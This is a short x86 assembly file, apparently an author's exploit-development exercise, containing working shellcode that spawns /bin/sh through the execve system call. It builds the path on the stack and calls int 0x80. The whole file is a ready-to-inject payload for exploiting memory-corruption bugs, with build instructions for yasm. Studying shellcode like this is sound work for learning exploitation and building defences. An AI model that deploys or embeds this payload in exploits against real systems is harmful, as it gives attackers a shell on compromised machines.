; Author: Abhinav Thakur
; Email : compilepeace@gmail.com
;
; Description : An execve '/bin/sh' spawning shellcode
; Compile : yasm -f bin ./shell.asm

%define SYS_EXECVE  0x0b

segment .text
global _start

_start:

    ; int execve (const char *pathname, char *const argv[], char *const envp[])
    xor eax, eax
    push eax                ; push NULL on stack
    push 0x68732f2f         ; "//sh"
    push 0x6e69622f         ; "/bin"
    mov ebx, esp            ; pathname = "/bin//sh\x00"
    
    push eax                ; stack --> \x00\x00\x00\x00 | "/bin//sh" | "\x00\x00\x00\x00"
    mov edx, esp            ; edx   --> "\x00\x00\x00\x00"
    push ebx                ; stack --> &("/bin//sh") | 0 | "/bin//sh" | 0 
    mov ecx, esp
    mov al, 0xb             ; syscall number        
    int 0x80

 